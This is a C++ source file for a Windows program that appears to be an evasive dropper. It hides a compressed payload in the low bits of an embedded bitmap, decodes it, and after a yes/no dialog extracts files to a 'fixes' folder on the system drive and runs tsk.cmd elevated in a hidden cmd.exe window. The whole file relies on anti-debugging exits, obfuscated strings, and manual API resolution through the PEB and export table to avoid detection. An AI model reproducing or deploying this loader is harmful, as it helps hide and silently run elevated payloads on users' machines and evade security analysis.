#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <windowsx.h>
#include <winternl.h>
#include <direct.h>
#include <array>

#include "swap.h"
static char valuebytes[256];

#define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
#define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }; };
#define eca(c)  enc_a<c>::v
#define ecb(c)  enc_b<c>::v
#define e1(s)  eca(s[0])        ,ecb( s[0])
#define e2(s)  e1(s) ,eca( s[1]),ecb( s[1])
#define e3(s)  e2(s) ,eca( s[2]),ecb( s[2])
#define e4(s)  e3(s) ,eca( s[3]),ecb( s[3])
#define e5(s)  e4(s) ,eca( s[4]),ecb( s[4])
#define e6(s)  e5(s) ,eca( s[5]),ecb( s[5])
#define e7(s)  e6(s) ,eca( s[6]),ecb( s[6])
#define e8(s)  e7(s) ,eca( s[7]),ecb( s[7])
#define e9(s)  e8(s) ,eca( s[8]),ecb( s[8])
#define e10(s) e9(s) ,eca( s[9]),ecb( s[9])
#define e11(s) e10(s),eca(s[10]),ecb(s[10])
#define e12(s) e11(s),eca(s[11]),ecb(s[11])
#define e13(s) e12(s),eca(s[12]),ecb(s[12])
#define e14(s) e13(s),eca(s[13]),ecb(s[13])
#define e15(s) e14(s),eca(s[14]),ecb(s[14])
#define e16(s) e15(s),eca(s[15]),ecb(s[15])
#define e17(s) e16(s),eca(s[16]),ecb(s[16])
#define e18(s) e17(s),eca(s[17]),ecb(s[17])
#define e19(s) e18(s),eca(s[18]),ecb(s[18])
#define e20(s) e19(s),eca(s[19]),ecb(s[19])
#define e21(s) e20(s),eca(s[20]),ecb(s[20])
#define e22(s) e21(s),eca(s[21]),ecb(s[21])
#define e23(s) e22(s),eca(s[22]),ecb(s[22])
#define e24(s) e23(s),eca(s[23]),ecb(s[23])
#define e25(s) e24(s),eca(s[24]),ecb(s[24])
#define e26(s) e25(s),eca(s[25]),ecb(s[25])
#define e27(s) e26(s),eca(s[26]),ecb(s[26])
#define e28(s) e27(s),eca(s[27]),ecb(s[27])
#define e29(s) e28(s),eca(s[28]),ecb(s[28])
#define e30(s) e29(s),eca(s[29]),ecb(s[29])
#define e31(s) e30(s),eca(s[30]),ecb(s[30])
#define e32(s) e31(s),eca(s[31]),ecb(s[31])
#define e33(s) e32(s),eca(s[32]),ecb(s[32])
#define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
#define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))
void __(const char *s,unsigned short l){
  uint8_t j=0;
  for(uint8_t i=0;i<l+1;i++){
    ((char *)s)[i]=valuebytes[merge_bytes(((char *)s)[j],((char *)s)[j+1])];
    j+=2;
  };
}
#define _s(n,s,l) const char n[]=_(s,l);__(n,l);

HINSTANCE hmsvcrt,huser32,hshell32,hgdi32,hkernel32;

typedef HMODULE (WINAPI *LLA)(LPCSTR);
LLA lla;
typedef BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*);
SEA sea;
typedef HBITMAP (WINAPI *CB)(int,int,UINT,UINT,const VOID*);
CB cbmp;
typedef HDC (WINAPI *CCDC)(HDC);
CCDC cdc;
typedef BOOL (WINAPI *DDC)(HDC);
DDC ddc;
typedef BOOL (WINAPI *DOB)(HGDIOBJ);
DOB dob;
typedef int (WINAPI *GOA)(HANDLE,int,LPVOID);
GOA goa;
typedef BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD);
BLT blt;
typedef HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ);
SOB sob;
typedef HPEN (WINAPI *CRP)(int,int,COLORREF);
CRP crp;
typedef BOOL (WINAPI *LTO)(HDC,int,int);
LTO lto;
typedef BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT);
MTE mte;
typedef BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL);
AWR awr;
typedef HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT);
BEP bep;
typedef BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *);
EPA epa;
typedef BOOL (WINAPI *GCR)(HWND,LPRECT);
GCR gcr;
typedef HDC (WINAPI *GDC)(HWND);
GDC gdc;
typedef int (WINAPI *GSM)(int);
GSM gsm;
typedef BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL);
IVR ivr;
typedef BOOL (WINAPI *PIR)(const RECT *,POINT);
PIR pir;
typedef BOOL (WINAPI *RCP)();
RCP rcp;
typedef int (WINAPI *RDC)(HWND,HDC);
RDC rdc;
typedef BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT);
TMV tmv;
typedef BOOL (WINAPI *UWI)(HWND);
UWI uwi;
typedef BOOL (WINAPI *FLIB)(HMODULE);
FLIB flib;
typedef ULONGLONG (WINAPI *VSCM)(ULONGLONG,DWORD,BYTE);
VSCM vscm;
typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
VVIA vvia;
typedef FARPROC (WINAPI *GPA)(HMODULE,LPCSTR);
GPA gpa;
typedef VOID (WINAPI *EXPW)(UINT);
EXPW expw;
typedef UINT (WINAPI *RWMA)(LPCSTR);
RWMA rwma;
typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
SMA sma;

typedef int (__cdecl *_access_t)(const char *,int);
_access_t _access_p;
typedef int (__cdecl *_mkdir_t)(const char *);
_mkdir_t _mkdir_p;
typedef int (__cdecl *fclose_t)(FILE *);
fclose_t fclose_p;
typedef errno_t (__cdecl *fopen_s_t)(FILE**,const char *,const char *);
fopen_s_t fopen_s_p;
typedef int (__cdecl *fputc_t)(int,FILE *);
fputc_t fputc_p;
typedef char *(__cdecl *getenv_t)(const char *);
getenv_t getenv_p;
typedef int (__cdecl *sprintf_t)(char *,const char * ... );
sprintf_t sprintf_p;
typedef size_t (__cdecl *strlen_t)(const char *);
strlen_t strlen_p;
typedef void (__cdecl *free_t)(void *);
free_t free_p;
typedef void *(__cdecl *calloc_t)(size_t,size_t);
calloc_t calloc_p;
/*
uint32_t __readfsdword(const uint32_t Offset){
    uint32_t value;
    __asm__ __volatile__("movl %%fs:%a[Offset], %k[value]" : [value] "=r" (value) : [Offset] "ir" (Offset));
    return value;
};
*/
inline void dbg(){
  DWORD pNtGlobalFlag=0;
  PPEB pPeb=(PPEB)__readfsdword(0x30);
  pNtGlobalFlag=*(PDWORD)((PBYTE)pPeb+0x68);

  PUINT32 pProcessHeap=(PUINT32)((PBYTE)pPeb+0x18);
  PUINT32 pFlags=(PUINT32)(*pProcessHeap+0x40);
  PUINT32 pForceFlags=(PUINT32)(*pProcessHeap+0x44);

  if((pNtGlobalFlag&0x70)||(*pFlags&~HEAP_GROWABLE)||*pForceFlags) expw(1);
  return;
};

template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
  if(l){
    p=(T*)gpa(l,f);
    if(!p) expw(1);
    char *c=(char *)f;
    while(*c) *c++=0;
    return;
  };
  expw(1);
};

HBITMAP hBitmap,hOldBitmap;
HDC hdc,hdcMem;
BITMAP bm;
HINSTANCE hI;
PAINTSTRUCT ps;
RECT rect,rc,rc_yes,rc_no;
HPEN hpen;
POINT mpos;
BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
TRACKMOUSEEVENT tme;
int dlg_ret=0;
bool inv=false;
uint8_t read_shift=0;
uint8_t *res;
uint8_t *image;

LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  dbg();
  switch(msg){
    case WM_CREATE:
      hBitmap=cbmp(506,191,1,32,image);
      goa(hBitmap,sizeof(BITMAP),&bm);
      hdc=gdc(hWnd);
      hdcMem=cdc(hdc);
      hOldBitmap=(HBITMAP)sob(hdcMem,hBitmap);
      hpen=crp(PS_SOLID,8,RGB(39,39,39));
      rdc(hWnd,hdc);
      return 0;
    case WM_KEYDOWN:
      if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
        DestroyWindow(hWnd);
        return 0;
      }
      else{
        if(wParam=='Y'||wParam=='y'){
          dlg_ret=1;
          DestroyWindow(hWnd);
          return 0;
        };
      };
      break;
    case WM_LBUTTONDOWN:
      rcp();
      sma(hWnd,0xA1,2,0);
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      if(pir(&rc_yes,mpos)){
        dlg_ret=1;
        DestroyWindow(hWnd);
        return 0;
      };
      if(pir(&rc_no,mpos)){
        DestroyWindow(hWnd);
        return 0;
      };
      break;
    case WM_MOUSEMOVE:
      if(!mousetrack) mousetrack=tmv(&tme);
      break;
    case WM_MOUSELEAVE:
      mousetrack=FALSE;
      if(mark_yes||mark_no) inv=true;
      mark_yes=FALSE;
      mark_no=FALSE;
      if(inv){
        ivr(hWnd,NULL,FALSE);
        uwi(hWnd);
        inv=false;
      };
      break;
    case WM_MOUSEHOVER:
      mousetrack=FALSE;
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      inv=false;
      if(pir(&rc_yes,mpos)){
        if(!mark_yes){
          mark_yes=TRUE;
          inv=true;
        };
        if(mark_no){
          mark_no=FALSE;
          inv=true;
        };
      }
      else{
        if(pir(&rc_no,mpos)){
          if(!mark_no){
            mark_no=TRUE;
            inv=true;
          };
          if(mark_yes){
            mark_yes=FALSE;
            inv=true;
          };
        }
        else{
          if(mark_yes||mark_no) inv=true;
          mark_no=FALSE;
          mark_yes=FALSE;
        };
      };
      if(inv){
        ivr(hWnd,NULL,FALSE);
        uwi(hWnd);
      };
      break;
    case WM_PAINT:
      hdc=bep(hWnd,&ps);
      gcr(hWnd,&rect);
      blt(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
      if(mark_yes){
        sob(hdc,hpen);
        mte(hdc,33,118,NULL);
        lto(hdc,53,138);
        lto(hdc,33,158);
        mte(hdc,220,118,NULL);
        lto(hdc,200,138);
        lto(hdc,220,158);
      };
      if(mark_no){
        sob(hdc,hpen);
        mte(hdc,286,118,NULL);
        lto(hdc,306,138);
        lto(hdc,286,158);
        mte(hdc,473,118,NULL);
        lto(hdc,453,138);
        lto(hdc,473,158);
      };
      epa(hWnd,&ps);
      break;
    case WM_DESTROY:
      PostQuitMessage(0);
      ddc(hdcMem);
      dob(hBitmap);
      dob(hOldBitmap);
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
}

int dlg_window(HINSTANCE hInstance){
  dbg();
  hI=hInstance;
  WNDCLASS wc;
  wc.style=0;
  wc.lpfnWndProc=dlg_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=LoadIconA(NULL,IDI_APPLICATION);
  wc.hCursor=LoadCursorA(NULL,IDC_ARROW);
  wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
  _s(idc,"imgdlgclass",11);
  wc.lpszClassName=idc;
  wc.lpszMenuName=NULL;
  wc.cbClsExtra=0;
  wc.cbWndExtra=0;
  RegisterClassA(&wc);
  rc={0,0,506,191};
  rc_yes={19,104,234,175};
  rc_no={272,104,487,175};
  awr(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
  int nWidth=rc.right-rc.left;
  int nHeight=rc.bottom-rc.top;
  int nX=(gsm(SM_CXSCREEN)-nWidth)/2;
  int nY=(gsm(SM_CYSCREEN)-nHeight)/2;
  if(nX<0) nX=0;
  if(nY<0) nY=0;
  tme.cbSize=sizeof(tme);
  tme.dwFlags=TME_HOVER|TME_LEAVE;
  tme.dwHoverTime=10;
  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
  if(!hWnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return 0;
  };
  tme.hwndTrack=hWnd;
  ShowWindow(hWnd,SW_SHOW);
  uwi(hWnd);
  MSG msg;
  while(GetMessageA(&msg,NULL,0,0)){
    DispatchMessageA(&msg);
    TranslateMessage(&msg);
  };
  UnregisterClassA(wc.lpszClassName, hInstance);
  return 0;
}

UINT null_msg;;

LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  dbg();
  switch(msg){
    case WM_CREATE:
      sma(hWnd,null_msg,0,0);
      return 0;
    case WM_CLOSE:
    case WM_DESTROY:
    case WM_ENDSESSION:
      PostQuitMessage(0);
      break;
    default:
      if(msg==null_msg){
        dlg_window(0);
        PostQuitMessage(0);
      };
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
};

void null_window(HINSTANCE hInstance){
  dbg();
  MSG msg;
  WNDCLASS wc;
  HWND hwnd;
  wc.style=wc.cbClsExtra=wc.cbWndExtra=0;
  wc.lpfnWndProc=null_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=wc.hCursor=NULL;
  wc.hbrBackground=NULL;
  wc.lpszMenuName=NULL;
  _s(clsn,"main",4);
  wc.lpszClassName=clsn;
  null_msg=rwma(wc.lpszClassName);
  if(!RegisterClassA(&wc)) return;
  hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
  if(!hwnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return;
  };
  while(GetMessageA(&msg,NULL,0,0)>0){
    DispatchMessageA(&msg);
  };
  UnregisterClassA(wc.lpszClassName,hInstance);
  return;
};

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

uint8_t flags;
uint8_t cbuffer[LZ_CAPACITY+1];
uint8_t vocbuf[0x10000];
uint32_t frequency[257];
uint16_t buf_size;
uint16_t vocroot;
uint16_t offset;
uint16_t lenght;
uint16_t symbol;
uint32_t low;
uint32_t hlp;
uint32_t range;
uint32_t *fc;
char *lowp;
char *hlpp;
uint8_t *cpos;
uint8_t rle_flag;

uint32_t dptr;
uint32_t dsize;
uint8_t *pdata;

uint8_t dgetc(){
  dbg();
  uint8_t s=0;
  if(dptr<dsize){
    s=pdata[dptr];
    dptr++;
  };
  return s;
}

uint8_t rc32_getc(uint8_t *c){
  while((range<0x10000)||(hlp<low)){
    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
      range=0x10000-(uint16_t)low;
    hlp<<=8;
    *hlpp=dgetc();
    if(dptr==dsize) return 0;
    low<<=8;
    range<<=8;
  };
  range/=*fc;
  uint32_t count=(hlp-low)/range;
  if(count>=*fc) return 1;
  symbol=0;
  uint16_t i,j=128;
  while(j){
    if(frequency[symbol]<=count) symbol+=j;
    else{
      if(symbol) symbol-=j;
      else break;
    };
    j>>=1;
  };
  if(frequency[symbol]>count&&symbol) symbol--;
  *c=(uint8_t)symbol;
  j=frequency[symbol++];
  low+=j*range;
  range*=frequency[symbol]-j;
  for(i=symbol;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    uint32_t *fp=frequency;
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      if((frequency[i]>>=1)==*fp++) frequency[i]++;
    };
  };
  return 0;
}

uint8_t unpack_file(){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(flags==0){
      cpos=cbuffer;
      if(rc32_getc(cpos++)) return 1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      for(i=lenght;i;i--)
        if(rc32_getc(cpos++)) return 1;
      cpos=cbuffer+1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos+++LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0x0100) return 1;
      if(offset<0x0100){
        rle_flag=1;
        symbol=offset;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 0;
}

void rmkdir(char *path,int depth){
  for(uint16_t i=depth;i<strlen_p(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(_access_p(path,0)!=0){
        _mkdir_p(path);
        if(_access_p(path,0)!=0) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

uint8_t read_packed_value(void *p,uint16_t s){
  for(uint16_t i=0;i<s;i++){
    if(unpack_file()) return 1;
    ((char *)p)[i]=(char)symbol;
  };
  return 0;
}

void init_unpack(const uint8_t *data_ptr,const uint32_t data_size_in){
  pdata=(uint8_t *)data_ptr;
  dsize=data_size_in;
  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
  offset=range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  uint32_t i;
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
  for(i=0;i<sizeof(uint32_t);i++){
    hlp<<=8;
    *hlpp=dgetc();
  }
};

void unarc(char *out){
  FILE *o;
  uint32_t fl=0,i;
  char *t=(char *)&fl,fp[257];
  for(;;){
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    for(i=0;i<strlen_p(out);i++) fp[i]=out[i];
    fp[i]='/';
    if(read_packed_value(&fp[strlen_p(out)+1],fl)) break;
    if(dptr==dsize) break;
    fp[fl+strlen_p(out)+1]=0;
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    rmkdir(fp,0);
    _s(wb,"wb",2);
    fopen_s_p(&o,fp,wb);
    if(o){
      for(i=0;i<fl;i++){
        if(unpack_file()) return;
        fputc_p((char)symbol,o);
      };
      fclose_p(o);
    };
  };
}

bool iswin10(){
  OSVERSIONINFOEXA osvi={sizeof(osvi),0,0,0,0,{0},0,0};
  DWORDLONG const dwlConditionMask=vscm(
    vscm(vscm(0,VER_MAJORVERSION,VER_GREATER_EQUAL),VER_MINORVERSION, VER_GREATER_EQUAL),VER_SERVICEPACKMAJOR,VER_GREATER_EQUAL);
  osvi.dwMajorVersion=HIBYTE(_WIN32_WINNT_WINTHRESHOLD);
  osvi.dwMinorVersion=LOBYTE(_WIN32_WINNT_WINTHRESHOLD);
  osvi.wServicePackMajor=0;
  return vvia(&osvi,VER_MAJORVERSION|VER_MINORVERSION|VER_SERVICEPACKMAJOR,dwlConditionMask)!=FALSE;
};

namespace obfs {
	template <typename Indexes> class MetaString;
	template <size_t... I> class MetaString<std::index_sequence<I...>> {
    public:
      constexpr MetaString(char const *str)
        : encrypted_buffer{ encrypt(str[I])... } {};
    public:
      inline const char* decrypt(void){
        for (size_t i=0;i<sizeof...(I);i++){
          buffer[i]=decrypt(encrypted_buffer[i]);
        };
        buffer[sizeof...(I)]=0;
        return buffer;
      }
    private:
      constexpr int  encrypt(char c) const { return (c+0xa)^F_0; } ;
      constexpr char decrypt(int c) const {  return (c^F_0)-0xa; } ;
    private:
      char buffer[sizeof...(I) + 1] {};
      int  encrypted_buffer[sizeof...(I)] {};
	};
};

#define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>>(str).decrypt())

void gpa_kernel(){
  __asm__ volatile(
    "xor (%0),      %0\n\t"
    "mov %%fs:0x30, %0\n\t"
    "mov 0x0C(%0),  %0\n\t"
    "mov 0x14(%0),  %0\n\t"
    "mov (%0),      %0\n\t"
    "mov (%0),      %0\n\t"
    "mov 0x10(%0),  %0\n\t"
    : "=r"(hkernel32));
  ULONG_PTR moduleBase;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_EXPORT_DIRECTORY eatDirectory;
  DWORD* eatFunctions;
  WORD* eatOrdinals;
  DWORD* eatNames;
  DWORD eatNameOffset;
	moduleBase=(ULONG_PTR)hkernel32;
  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
	ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
	eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
  char *kern_gpa=(char *)o("GetProcAddress");
  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
    eatNameOffset=eatNames[i];
    char *src=(char*)(moduleBase+eatNameOffset);
    char *dst=kern_gpa;
    while(*src && *dst){
      if(*src!=*dst) break;
      src++;
      dst++;
    };
    if(*src==0 && *dst==0) gpa=(GPA)(moduleBase+eatFunctions[eatOrdinals[i]]);
  };
  kern_gpa=(char *)o("ExitProcess");
  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
    eatNameOffset=eatNames[i];
    char *src=(char*)(moduleBase+eatNameOffset);
    char *dst=kern_gpa;
    while(*src && *dst){
      if(*src!=*dst) break;
      src++;
      dst++;
    };
    if(*src==0 && *dst==0) expw=(EXPW)(moduleBase+eatFunctions[eatOrdinals[i]]);
  };
};

#define data_res 0x10
#define image_size 386584

inline uint8_t *load_res(uint32_t id){
  HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
  if(res){
    HGLOBAL res_handle=LoadResource(NULL,res);
    if(res_handle){
      return (uint8_t*)LockResource(res_handle);
    };
    return NULL;
  };
  return NULL;
};

inline uint8_t bytes2byte(){
  uint8_t b=0;
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  return b;
};

inline void bytes2uint(uint32_t &b){
  b=0;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte();
};

void init(){
  gpa_kernel();
  res=(uint8_t *)(load_res(data_res)+54);
  if(res==NULL) expw(1);
  uint32_t c=0;
  bytes2uint(c);
  for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
  dbg();
  _s(dll_u,"User32",6);
  _s(dll_m,"msvcrt",6);
  _s(dll_s,"Shell32",7);
  _s(dll_g,"Gdi32",5);
  _s(f0000,"_access",7);
  _s(f0001,"_mkdir",6);
  _s(f0002,"fclose",6);
  _s(f0003,"fopen_s",7);
  _s(f0004,"fputc",5);
  _s(f0005,"getenv",6);
  _s(f0006,"sprintf",7);
  _s(f0007,"strlen",6);
  _s(f0008,"free",4);
  _s(f0009,"calloc",6);
  _s(f0010,"CreateBitmap",12);
  _s(f0011,"CreateCompatibleDC",18);
  _s(f0012,"DeleteDC",8);
  _s(f0013,"DeleteObject",12);
  _s(f0014,"GetObjectA",10);
  _s(f0015,"ShellExecuteExA",15);
  _s(f0016,"FreeLibrary",11);
  _s(f0017,"BitBlt",6);
  _s(f0018,"SelectObject",12);
  _s(f0019,"CreatePen",9);
  _s(f0020,"LineTo",6);
  _s(f0021,"MoveToEx",8);
  _s(f0022,"AdjustWindowRect",16);
  _s(f0023,"BeginPaint",10);
  _s(f0024,"EndPaint",8);
  _s(f0025,"GetClientRect",13);
  _s(f0026,"GetDC",5);
  _s(f0027,"GetSystemMetrics",16);
  _s(f0028,"InvalidateRect",14);
  _s(f0029,"PtInRect",8);
  _s(f0030,"ReleaseCapture",14);
  _s(f0031,"ReleaseDC",9);
  _s(f0032,"TrackMouseEvent",15);
  _s(f0033,"UpdateWindow",12);
  _s(f0034,"LoadLibraryA",12);
  _s(f0035,"VerSetConditionMask",19);
  _s(f0036,"VerifyVersionInfoA",18);
  _s(f0037,"RegisterWindowMessageA",22);
  _s(f0038,"SendMessageA",12);
  get_fn_ptr(flib,hkernel32,f0016);
  get_fn_ptr(lla,hkernel32,f0034);
  hmsvcrt=lla(dll_m);
  huser32=lla(dll_u);
  hgdi32=lla(dll_g);
  hshell32=lla(dll_s);
  get_fn_ptr(vscm,hkernel32,f0035);
  get_fn_ptr(vvia,hkernel32,f0036);
  get_fn_ptr(_access_p,hmsvcrt,f0000);
  get_fn_ptr(_mkdir_p,hmsvcrt,f0001);
  get_fn_ptr(fclose_p,hmsvcrt,f0002);
  get_fn_ptr(fopen_s_p,hmsvcrt,f0003);
  get_fn_ptr(fputc_p,hmsvcrt,f0004);
  get_fn_ptr(getenv_p,hmsvcrt,f0005);
  get_fn_ptr(sprintf_p,hmsvcrt,f0006);
  get_fn_ptr(strlen_p,hmsvcrt,f0007);
  get_fn_ptr(free_p,hmsvcrt,f0008);
  get_fn_ptr(calloc_p,hmsvcrt,f0009);
  get_fn_ptr(awr,huser32,f0022);
  get_fn_ptr(bep,huser32,f0023);
  get_fn_ptr(epa,huser32,f0024);
  get_fn_ptr(gcr,huser32,f0025);
  get_fn_ptr(gdc,huser32,f0026);
  get_fn_ptr(gsm,huser32,f0027);
  get_fn_ptr(ivr,huser32,f0028);
  get_fn_ptr(pir,huser32,f0029);
  get_fn_ptr(rcp,huser32,f0030);
  get_fn_ptr(rdc,huser32,f0031);
  get_fn_ptr(tmv,huser32,f0032);
  get_fn_ptr(uwi,huser32,f0033);
  get_fn_ptr(rwma,huser32,f0037);
  get_fn_ptr(sma,huser32,f0038);
  get_fn_ptr(cbmp,hgdi32,f0010);
  get_fn_ptr(cdc,hgdi32,f0011);
  get_fn_ptr(ddc,hgdi32,f0012);
  get_fn_ptr(dob,hgdi32,f0013);
  get_fn_ptr(goa,hgdi32,f0014);
  get_fn_ptr(blt,hgdi32,f0017);
  get_fn_ptr(sob,hgdi32,f0018);
  get_fn_ptr(crp,hgdi32,f0019);
  get_fn_ptr(lto,hgdi32,f0020);
  get_fn_ptr(mte,hgdi32,f0021);
  get_fn_ptr(sea,hshell32,f0015);
  if (!iswin10()) expw(0);
};

INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,INT nCmdShow){
  init();
  image=(uint8_t*)calloc_p(image_size,1);
  if(image){
    uint32_t res_size=0;
    bytes2uint(res_size);
    uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
    if(packed){
      for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
      init_unpack(packed,res_size);
      for(uint32_t i=0;i<image_size;i++){
        if(unpack_file()) break;
        image[i]=(uint8_t)symbol;
        if(dptr==dsize) break;
      };
      free_p(packed);
    } else expw(1);
    null_window(0);
    if(dlg_ret){
      _s(drv_e,"SYSTEMDRIVE",11);
      _s(mas_a,"%s/",3);
      _s(sea_m,"runas",5);
      _s(sea_c,"cmd.exe",7);
      _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
      _s(sea_r,"/c rd /s /q %SYSTEMDRIVE%\\fixes",31);
      char path[257];
      sprintf_p(path,mas_a,getenv_p(drv_e));
      bytes2uint(res_size);
      uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
      if(packed){
        for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
        init_unpack(packed,res_size);
        unarc(path);
        SHELLEXECUTEINFO ShExecInfo;
        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask=0;
        ShExecInfo.hwnd=NULL;
        ShExecInfo.lpVerb=sea_m;
        ShExecInfo.lpFile=sea_c;
        ShExecInfo.lpParameters=sea_o;
        ShExecInfo.lpDirectory=NULL;
        ShExecInfo.nShow=0;
        ShExecInfo.hInstApp=0;
        if(sea(&ShExecInfo)==FALSE){
          ShExecInfo.lpVerb=NULL;
          ShExecInfo.lpParameters=sea_r;
          sea(&ShExecInfo);
        };
        free_p(packed);
      } else expw(1);
    };
    free_p(image);
  };
  flib(hshell32);
  flib(hgdi32);
  flib(huser32);
  flib(hmsvcrt);
  return 0;
}
